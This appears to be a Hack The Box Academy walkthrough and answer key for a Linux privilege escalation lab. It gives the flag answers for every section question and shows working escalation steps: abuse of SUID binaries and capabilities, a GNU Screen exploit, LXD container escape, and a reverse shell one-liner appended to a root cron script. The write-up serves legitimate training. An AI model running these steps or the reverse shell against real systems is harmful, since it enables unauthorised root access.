
![[cheatsheat-Linux Privilege Escalation]]

# Linux Privilege Escalation Module



## Section Questions and their Answers

| Section                                              | Question Number | Answer                                |
| ---------------------------------------------------- | --------------- | ------------------------------------- |
| Environment Enumeration                              | Question 1      | HTB{1nt3rn4l_5cr1p7_l34k}             |
| Linux Services & Internals Enumeration               | Question 1      | 3.11                                  |
| Credential Hunting                                   | Question 1      | W0rdpr3ss_sekur1ty!                   |
| Path Abuse                                           | Question 1      | /tmp                                  |
| Escaping Restricted Shells                           | Question 1      | HTB{35c4p3_7h3_r3stricted_5h311}      |
| Special Permissions                                  | Question 1      | /bin/sed                              |
| Special Permissions                                  | Question 2      | /usr/bin/facter                       |
| Sudo Rights Abuse                                    | Question 1      | /usr/bin/openssl                      |
| Privileged Groups                                    | Question 1      | ch3ck_th0se_gr0uP_m3mb3erSh1Ps!       |
| Capabilities                                         | Question 1      | HTB{c4paBili7i3s_pR1v35c}             |
| Vulnerable Services                                  | Question 1      | 91927dad55ffd22825660da88f2f92e0      |
| Cron Job Abuse                                       | Question 1      | 14347a2c977eb84508d3d50691a7ac4b      |
| LXD                                                  | Question 1      | HTB{C0nT41n3rs_uhhh}                  |
| Docker                                               | Question 1      | HTB{D0ck3r_Pr1vE5c}                   |
| Logrotate                                            | Question 1      | HTB{l0G_r0t7t73N_00ps}                |
| Miscellaneous Techniques                             | Question 1      | fc8c065b9384beaa162afe436a694acf      |
| Kernel Exploits                                      | Question 1      | 46237b8aa523bc7e0365de09c0c0164f      |
| Shared Libraries                                     | Question 1      | 6a9c151a599135618b8f09adc78ab5f1      |
| Shared Object Hijacking                              | Question 1      | 2.27                                  |
| Python Library Hijacking                             | Question 1      | HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX} |
| Sudo                                                 | Question 1      | HTB{SuD0_e5c4l47i0n_1id}              |
| Polkit                                               | Question 1      | HTB{p0Lk1tt3n}                        |
| Dirty Pipe                                           | Question 1      | HTB{D1rTy_DiR7Y}                      |
| Linux Local Privilege Escalation - Skills Assessment | Question 1      | LLPE{d0n_ov3rl00k_h1dden_f1les!}      |
| Linux Local Privilege Escalation - Skills Assessment | Question 2      | LLPE{ch3ck_th0se_cmd_l1nes!}          |
| Linux Local Privilege Escalation - Skills Assessment | Question 3      | LLPE{h3y_l00k_a_fl@g!}                |
| Linux Local Privilege Escalation - Skills Assessment | Question 4      | LLPE{im_th3_m@nag3r_n0w}              |
| Linux Local Privilege Escalation - Skills Assessment | Question 5      | LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!}    |

## Acronyms Used in Writeups

|Acronym|Meaning|
|---|---|
|STMIP|Spawned Target Machine IP Address|
|STMPO|Spawned Target Machine Port|
|PMVPN|Personal Machine with a Connection to the Academy's VPN|
|PWNIP|Pwnbox IP Address (or PMVPN IP Address)|
|PWNPO|Pwnbox Port (or PMVPN Port)|

# Environment Enumeration

## Question 1

### "Enumerate the Linux environment and look for interesting files that might contain sensitive data. Submit the flag as the answer."

Students first need to connect to the spawned target machine using `SSH` and the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.15.186]─[htb-ac-594497@htb-gdlgiim4hw]─[~]
└──╼ [★]$ ssh htb-student@10.129.205.110

The authenticity of host '10.129.205.110 (10.129.205.110)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.205.110' (ECDSA) to the list of known hosts.
htb-student@10.129.205.110's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-148-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

<SNIP>

$ 
```

Then, students need to use the `find` command to look for bash scripts. Additionally, each of these scripts should be checked to see they contain a flag starting with "HTB" :

Code: shell

```shell
find / -name *.sh 2>/dev/null | xargs cat | grep "HTB"
```

```shell-session
$ find / -name *.sh 2>/dev/null | xargs cat | grep "HTB"

HTB{1nt3rn4l_5cr1p7_l34k}
```

The flag is revealed to be `HTB{1nt3rn4l_5cr1p7_l34k}`.

Answer: `HTB{1nt3rn4l_5cr1p7_l34k}`

# Linux Services & Internals Enumeration

## Question 1

### "What is the latest Python version that is installed on the target?"

Students first need to connect to the spawned target machine using `SSH` and the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.15.186]─[htb-ac-594497@htb-gdlgiim4hw]─[~]
└──╼ [★]$ ssh htb-student@10.129.205.110

The authenticity of host '10.129.205.110 (10.129.205.110)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.205.110' (ECDSA) to the list of known hosts.
htb-student@10.129.205.110's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-148-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

<SNIP>

$ 
```

Next, students should elevate from a Bourne shell to a Bash shell:

Code: shell

```shell
bash -i
```

```shell-session
$ bash -i

htb-student@ubuntu:~$ 
```

Now, students need to retrieves a list of installed Python 3 packages by filtering the output of the `apt list --installed` command:

Code: shell

```shell
apt list --installed | tr "/" " " | cut -d" " -f1,3 | grep "^python3.[0-9][0-9] " | cut -d" " -f1
```

```shell-session
htb-student@ubuntu:~$ apt list --installed | tr "/" " " | cut -d" " -f1,3 | grep "^python3.[0-9][0-9] " | cut -d" " -f1

WARNING: apt does not have a stable CLI interface. Use with caution in scripts.

python3.11
```

Additionally, to see all installed python3 versions, students can create an `installed_pkgs.list` file and search for all instances of python3:

Code: shell

```shell
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

cat installed_pkgs.list | grep python3 | sort -u
```

```shell-session
htb-student@ubuntu:~$ apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

WARNING: apt does not have a stable CLI interface. Use with caution in scripts.

Listing...
accountsservice 0.6.55-0ubuntu12~20.04.4
adduser 3.118ubuntu2
alsa-topology-conf 1.2.2-1
alsa-ucm-conf 1.2.2-1ubuntu0.10
amd64-microcode 3.20191218.1ubuntu1
apparmor 2.13.3-7ubuntu5.1

<SNIP>

htb-student@ubuntu:~$ cat installed_pkgs.list | grep python3 | sort -u
libpython3-stdlib 3.8.2-0ubuntu2
libpython3.11-minimal 3.11.3-1+focal1
libpython3.11-stdlib 3.11.3-1+focal1
libpython3.8 3.8.10-0ubuntu1~20.04.7
libpython3.8-minimal 3.8.10-0ubuntu1~20.04.7
<SNIP>
python3.11 3.11.3-1+focal1
python3.11-minimal 3.11.3-1+focal1
python3.8 3.8.10-0ubuntu1~20.04.7
python3.8-minimal 3.8.10-0ubuntu1~20.04.7
```

The highest python3 version installed is shown to be `3.11`.

Answer: `3.11`

# Credential Hunting

## Question 1

### "Find the WordPress database password."

Students first need to connect to `STMIP` with `SSH` using the credentials `htb-student:Academy_LLPE!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.118]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh htb-student@10.129.2.210

The authenticity of host '10.129.2.210 (10.129.2.210)' can't be established.
ECDSA key fingerprint is SHA256:jqHwbeBBQLd/z1BFRM732tTqQbhKGni0KhrGMszsiVM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? Yes
Warning: Permanently added '10.129.2.210' (ECDSA) to the list of known hosts.
htb-student@10.129.2.210's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)

<SNIP>

htb-student@NIX02:~$
```

Subsequently, students need to print out the contents of the `wp-config.php` file in `/var/www/html` and use `grep` to filter out the database password:

Code: shell

```shell
cat /var/www/html/wp-config.php | grep "DB_PASSWORD"
```

```shell-session
htb-student@NIX02:~$ cat /var/www/html/wp-config.php | grep "DB_PASSWORD"

define( 'DB_PASSWORD', 'W0rdpr3ss_sekur1ty!' );
```

Answer: `W0rdpr3ss_sekur1ty!`

# Path Abuse

## Question 1

### "Review the PATH of the htb-student user. What non-default directory is path of the user's PATH?"

First, students need to connect to `STMIP` with `SSH` using the credentials `htb-student:Academy_LLPE!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.118]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh htb-student@10.129.2.210

The authenticity of host '10.129.2.210 (10.129.2.210)' can't be established.
ECDSA key fingerprint is SHA256:jqHwbeBBQLd/z1BFRM732tTqQbhKGni0KhrGMszsiVM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? Yes
Warning: Permanently added '10.129.2.210' (ECDSA) to the list of known hosts.
htb-student@10.129.2.210's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)

<SNIP>

htb-student@NIX02:~$
```

Students then need to view the environment variable `$PATH` to find out the non-default `/tmp` directory:

Code: shell

```shell
echo $PATH
```

```shell-session
htb-student@NIX02:~$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/tmp
```

Answer: `/tmp`

# Escaping Restricted Shells

## Question 1

### "Use different approaches to escape the restricted shell and read the flag.txt file. Submit the contents as the answer."

Students need to use a search engine and look for Rbash bypasses, eventually finding the following article [Linux Restricted Shell Bypass | VK9 Security (vk9-sec.com)](https://vk9-sec.com/linux-restricted-shell-bypass/).

Under Advanced Techniques, students will see multiple SSH bypasses:

![Linux_Privilege_Escalation_Walkthrough_Image_1.png](https://academy.hackthebox.com/storage/walkthroughs/50/Linux_Privilege_Escalation_Walkthrough_Image_1.png)

Students need to reproduce the ssh2 bypass. The flag's content is shown to be `HTB{35c4p3_7h3_r3stricted_5h311}`.:

Code: shell

```shell
ssh htb-user@STMIP -t "bash --noprofile"
Ctrl+c
ls
cat flag.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.15.186]─[htb-ac-594497@htb-gdlgiim4hw]─[~]
└──╼ [★]$ ssh htb-user@10.129.37.149 -t "bash --noprofile"

htb-user@10.129.37.149's password: 
^C
htb-user@ubuntu:~$ ls

bin  flag.txt
htb-user@ubuntu:~$ cat flag.txt

HTB{35c4p3_7h3_r3stricted_5h311}
```

Answer: `HTB{35c4p3_7h3_r3stricted_5h311}`

# Special Permissions

## Question 1

### "Find a file with the setuid bit set that was not shown in the section command output (full path to the binary)."

Students first need to connect to `STMIP` with `SSH` using the credentials `htb-student:Academy_LLPE!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.118]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh htb-student@10.129.119.156

The authenticity of host '10.129.119.156 (10.129.119.156)' can't be established.
ECDSA key fingerprint is SHA256:jqHwbeBBQLd/z1BFRM732tTqQbhKGni0KhrGMszsiVM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? Yes
Warning: Permanently added '10.129.119.156' (ECDSA) to the list of known hosts.
htb-student@10.129.119.156's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)

<SNIP>

htb-student@NIX02:~$
```

Students subsequently need to search for binaries with the `SETUID` bit on using `find`:

Code: shell

```shell
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

```shell-session
htb-student@NIX02:~$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-xr-x 1 root root 16728 Sep  1  2020 /home/htb-student/shared_obj_hijack/payroll
-rwsr-xr-x 1 root root 16728 Sep  1  2020 /home/mrb3n/payroll
-rwSr--r-- 1 root root 0 Aug 31  2020 /home/cliff.moore/netracer
-rwsr-xr-x 1 root root 40152 Nov 30  2017 /bin/mount
-rwsr-xr-x 1 root root 40128 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 73424 Feb 12  2016 /bin/sed
-rwsr-xr-x 1 root root 27608 Nov 30  2017 /bin/umount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14864 Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 428240 Jan 18  2018 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 23376 Jan 18  2016 /usr/bin/pkexec
-rwsr-sr-x 1 root root 240 Feb  1  2016 /usr/bin/facter
-rwsr-xr-x 1 root root 39904 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 49584 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 75304 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 54256 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 10624 May  9  2018 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 1588768 Aug 31  2020 /usr/bin/screen-4.5.0
-rwsr-xr-x 1 root root 94240 Jun  9  2020 /sbin/mount.nfs
```

Students will notice that the file not mentioned in the section's command output is `/bin/sed`.

Answer: `/bin/sed`

# Special Permissions

## Question 2

### "Find a file with the setgid bit set that was not shown in the section command output (full path to the binary)."

Using the same SSH connection from the previous question, students need to use `find` to find binaries with the `SETGID` bit on:

Code: shell

```shell
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

```shell-session
htb-student@NIX02:~$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine
-rwsr-sr-x 1 root root 240 Feb  1  2016 /usr/bin/facter
```

Students will notice that the file not mentioned in the section's command output is `/usr/bin/facter`.

Answer: `/usr/bin/facter`

# Sudo Rights Abuse

## Question 1

### "What command can the htb-student user run as root?"

Students first need to connect to `STMIP` with `SSH` using the credentials `htb-student:Academy_LLPE!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.118]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh htb-student@10.129.119.156

The authenticity of host '10.129.119.156 (10.129.119.156)' can't be established.
ECDSA key fingerprint is SHA256:jqHwbeBBQLd/z1BFRM732tTqQbhKGni0KhrGMszsiVM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? Yes
Warning: Permanently added '10.129.119.156' (ECDSA) to the list of known hosts.
htb-student@10.129.119.156's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)

<SNIP>

htb-student@NIX02:~$
```

Subsequently, students need to run `sudo` with the `-l` (short version of the long version `--list`) option:

Code: shell

```shell
sudo -l
```

```shell-session
htb-student@NIX02:~/shared_obj_hijack$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: /usr/bin/openssl
```

Students will find that the `htb-user` can run `/usr/bin/openssl` as `root`.

Answer: `/usr/bin/openssl`

# Privileged Groups

## Question 1

### "Use the privileged group rights of the secaudit user to locate a flag."

Students first need to connect to `STMIP` with `SSH` using the credentials `secaudit:Academy_LLPE!`:

Code: shell

```shell
ssh secaudit@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.118]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh secaudit@10.129.2.210

The authenticity of host '10.129.2.210 (10.129.2.210)' can't be established.
ECDSA key fingerprint is SHA256:jqHwbeBBQLd/z1BFRM732tTqQbhKGni0KhrGMszsiVM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? Yes
Warning: Permanently added '10.129.2.210' (ECDSA) to the list of known hosts.
htb-student@10.129.2.210's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)

<SNIP>

secaudit@NIX02:~$
```

Students subsequently need to use the `id` command to view the user's group membership:

Code: shell

```shell
id
```

```shell-session
secaudit@NIX02:~$ id

uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```

Students will notice that the user is part of the `adm` group, which allows reading all of the files under the directory `/var/log/`, thus, students need to use `grep` recursively on the `/var/log/` directory searching for the string "flag" within any file inside it:

Code: shell

```shell
grep -rw "flag" /var/log 2>/dev/null
```

```shell-session
secaudit@NIX02:~$ grep -rw "flag" /var/log 2>/dev/null

/var/log/apache2/access.log:10.10.14.3 - - [01/Sep/2020:05:34:22 +0200] "GET /flag%20=%20ch3ck_th0se_gr0uP_m3mb3erSh1Ps! HTTP/1.1" 301 409 "-" "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
/var/log/apache2/access.log:10.10.14.3 - - [01/Sep/2020:05:34:22 +0200] "GET /flag%20=%20ch3ck_th0se_gr0uP_m3mb3erSh1Ps HTTP/1.1" 404 27847 "-" "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
```

Removing the URL-encoded white-space character `%20` from the beginning of the `flag` URL parameter, students will know that the flag is `ch3ck_th0se_gr0uP_m3mb3erSh1Ps!`.

Answer: `ch3ck_th0se_gr0uP_m3mb3erSh1Ps!`

# Capabilities

## Question 1

### "Escalate the privileges using capabilities and read the flag.txt file in the "/root" directory. Submit its contents as the answer."

Students first need to connect to the spawned target machine using `SSH` and the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.15.186]─[htb-ac-594497@htb-7jmoga2pu3]─[~]
└──╼ [★]$ ssh htb-student@10.129.61.128

The authenticity of host '10.129.61.128 (10.129.61.128)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.61.128' (ECDSA) to the list of known hosts.
htb-student@10.129.61.128's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-149-generic x86_64)

<SNIP>

htb-student@ubuntu:~$
```

Next, students need to enumerate binaries with set capabilities:

Code: shell

```shell
find /usr/bin/ /usr/sbin/ /usr/local/bin/ /usr/local/sbin/ -type f -exec getcap {} \; 
```

```shell-session
htb-student@ubuntu:~$ find /usr/bin/ /usr/sbin/ /usr/local/bin/ /usr/local/sbin/ -type f -exec getcap {} \; 

/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_dac_override+eip
```

Utilizing the `cap_dac_override` capability on the `vim.basic` binary (which allows for override of access controls), students need to use the binary to view the /etc/passwd file, deleting the `x` on the line for the root user:

Code: shell

```shell
 /usr/bin/vim.basic /etc/passwd
```

![Linux_Privilege_Escalation_Walkthrough_Image_2.png](https://academy.hackthebox.com/storage/walkthroughs/50/Linux_Privilege_Escalation_Walkthrough_Image_2.png)

After saving the changes, students need to switch to the root user and read the flag:

Code: shell

```shell
su root
cat /root/flag.txt
```

```shell-session
htb-student@ubuntu:~$ su root

root@ubuntu:/home/htb-student# cat /root/flag.txt

HTB{c4paBili7i3s_pR1v35c}
```

The flag reads `HTB{c4paBili7i3s_pR1v35c}`.

Answer: `HTB{c4paBili7i3s_pR1v35c}`

# Vulnerable Services

## Question 1

### "Connect to the target system and escalate privileges using the Screen exploit. Submit the contents of the flag.txt file in the /root/screen_exploit directory."

Students first need to connect to the spawned target machine with `SSH` using the credentials `htb-student:Academy_LLPE!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.118]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh htb-student@10.129.2.210

The authenticity of host '10.129.2.210 (10.129.2.210)' can't be established.
ECDSA key fingerprint is SHA256:jqHwbeBBQLd/z1BFRM732tTqQbhKGni0KhrGMszsiVM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? Yes
Warning: Permanently added '10.129.2.210' (ECDSA) to the list of known hosts.
htb-student@10.129.119.156's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)

<SNIP>

htb-student@NIX02:~$
```

Then, students need to use `searchsploit` on `Pwnbox`/`PMVPN` to search for the exploit code `GNU Screen 4.5.0`:

Code: shell

```shell
searchsploit "GNU Screen 4.5.0"
```

```shell-session
┌─[us-academy-1]─[10.10.14.12]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ searchsploit "GNU Screen 4.5.0"

--------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                               |  Path
--------------------------------------------------------------------------------------------- ---------------------------------
GNU Screen 4.5.0 - Local Privilege Escalation                                                | linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                          | linux/local/41152.txt
--------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Subsequently, students need to mirror/copy the exploit code `linux/local/41154.sh` locally:

Code: shell

```shell
searchsploit -m "linux/local/41154.sh"
```

```shell-session
┌─[us-academy-1]─[10.10.14.12]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ searchsploit -m linux/local/41154.sh

  Exploit: GNU Screen 4.5.0 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/41154
     Path: /usr/share/exploitdb/exploits/linux/local/41154.sh
File Type: Bourne-Again shell script, ASCII text executable

Copied to: /home/htb-ac413848/41154.sh
```

Students then need to transfer the executable exploit to `STMIP` using any file transfer method, such as with `scp`, utilizing the credentials `htb-student:Academy_LLPE!`:

Code: shell

```shell
scp 41154.sh htb-student@PWNIP:/home/htb-student/
```

```shell-session
┌─[us-academy-1]─[10.10.14.12]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ scp 41154.sh htb-student@10.129.2.210:/home/htb-student/

htb-student@10.129.2.210's password: 
41154.sh			100% 1149    13.1KB/s   00:00
```

Once successfully transferred, students need to run the exploit on the spawned target machine:

Code: shell

```shell
./41154.sh
```

```shell-session
htb-student@NIX02:~$ ./41154.sh 

~ gnu/screenroot ~
[+] First, we create our shell and library...

<SNIP>

[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /run/screen/S-htb-student.

# 
```

At last, students need to print out the contents of the flag file "flag.txt" located at `/root/screen_exploit`:

Code: shell

```shell
cat /root/screen_exploit/flag.txt
```

```shell-session
# cat /root/screen_exploit/flag.txt

91927dad55ffd22825660da88f2f92e0
```

Answer: `91927dad55ffd22825660da88f2f92e0`

# Cron Job Abuse

## Question 1

### "Connect to the target system and escalate privileges by abusing the misconfigured cron job. Submit the contents of the flag.txt file in the /root/cron_abuse directory."

Students first need to start an `nc` listener on Pwnbox/`PMVPN`:

Code: shell

```shell
sudo nc -nvlp 443
```

```shell-session
┌─[us-academy-1]─[10.10.14.25]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo nc -nvlp 443

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
```

Students then need to connect to the spawned target machine with `STMIP` using `SSH` and the credentials `htb-student:Academy_LLPE!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.118]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh htb-student@10.129.2.210

The authenticity of host '10.129.2.210 (10.129.2.210)' can't be established.
ECDSA key fingerprint is SHA256:jqHwbeBBQLd/z1BFRM732tTqQbhKGni0KhrGMszsiVM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? Yes
Warning: Permanently added '10.129.2.210' (ECDSA) to the list of known hosts.
htb-student@10.129.2.210's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)

<SNIP>

htb-student@NIX02:~$
```

Subsequently, students need to edit the script `backup.sh` under the directory `/dmz-backups/` and append a reverse shell one-liner:

Code: shell

```shell
echo 'bash -i >& /dev/tcp/PWNIP/443 0>&1' >> /dmz-backups/backup.sh
```

```shell-session
htb-student@NIX02:~$ echo 'bash -i >& /dev/tcp/10.10.14.25/443 0>&1' >> /dmz-backups/backup.sh
```

After waiting for a bit, students will receive a root shell on the `nc` listener:

```shell-session
Ncat: Connection from 10.129.150.148.
Ncat: Connection from 10.129.150.148:52132.
bash: cannot set terminal process group (1658): Inappropriate ioctl for device
bash: no job control in this shell
root@NIX02:~#
```

At last, students need to print out the contents of the flag file "flag.txt" at `/root/cron_abuse/`:

Code: shell

```shell
cat /root/cron_abuse/flag.txt
```

```shell-session
root@NIX02:~# cat /root/cron_abuse/flag.txt

cat /root/cron_abuse/flag.txt
14347a2c977eb84508d3d50691a7ac4b
```

Answer: `14347a2c977eb84508d3d50691a7ac4b`

# LXD

## Question 1

### "Escalate the privileges and submit the contents of flag.txt as the answer."

Students first need to connect to the spawned target machine using `SSH` and the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh htb-student@STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.15.63]─[htb-ac-594497@htb-h5qyjhxa2m]─[~]
└──╼ [★]$ ssh htb-student@10.129.23.7
The authenticity of host '10.129.23.7 (10.129.23.7)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.23.7' (ECDSA) to the list of known hosts.
htb-student@10.129.23.7's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.19.0-051900-generic x86_64)

<SNIP>

htb-student@ubuntu:~$ 
```

Upon connecting, students need to inspect the contents of the ContainerImages directory:

Code: shell

```shell
cd ContainerImages/
ls
```

```shell-session
htb-student@ubuntu:~$ cd ContainerImages/
htb-student@ubuntu:~/ContainerImages$ ls

alpine-v3.18-x86_64-20230607_1234.tar.gz
```

Discovering the `alpine-v3.18-x86_64-20230607_1234.tar.gz` file, students need to import the image:

Code: shell

```shell
lxc image import ./alpine-v3.18-x86_64-20230607_1234.tar.gz --alias alpine-container 
lxc image list
```

```shell-session
htb-student@ubuntu:~/ContainerImages$ lxc image import ./alpine-v3.18-x86_64-20230607_1234.tar.gz --alias alpine-container 

Image imported with fingerprint: b14f17d61b9d2997ebe1d3620fbfb2e48773678c186c2294c073e2122c41a485

htb-student@ubuntu:~/ContainerImages$ lxc image list

+------------------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
|      ALIAS       | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+------------------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| alpine-container | b14f17d61b9d | no     | alpine v3.18 (20230607_12:34) | x86_64       | CONTAINER | 3.62MB | Jun 20, 2023 at 5:22pm (UTC) |
+------------------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
```

After verifying that the image has been successfully imported, students need to initiate the image and configure it with the `security.privileged=true` flag. Additionally, students need to mount the `/root` directory from the host machine to `/mnt/root` inside the container, making the host's `/root` directory accessible within the container.

Code: shell

```shell
lxc init alpine-container privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/root path=/mnt/root recursive=true
```

```shell-session
htb-student@ubuntu:~/ContainerImages$ lxc init alpine-container privesc -c security.privileged=true

Creating privesc

htb-student@ubuntu:~/ContainerImages$ lxc config device add privesc host-root disk source=/root path=/mnt/root recursive=true

Device host-root added to privesc
```

Finally, students need to start the container and execute the shell interpreter `/bin/sh`:

Code: shell

```shell
lxc start privesc
lxc exec privesc /bin/sh
```

```shell-session
htb-student@ubuntu:~/ContainerImages$ lxc start privesc

htb-student@ubuntu:~/ContainerImages$ lxc exec privesc /bin/sh

~ # 
```

With the new root shell, students need to read the contents of the flag:

Code: shell

```shell
cat /mnt/root/flag.txt
```

```shell-session
~ # cat /mnt/root/flag.txt

HTB{C0nT41n3rs_uhhh}
```

The flag reads `HTB{C0nT41n3rs_uhhh}`.

Answer: `HTB{C0nT41n3rs_uhhh}`

# Docker

## Question 1

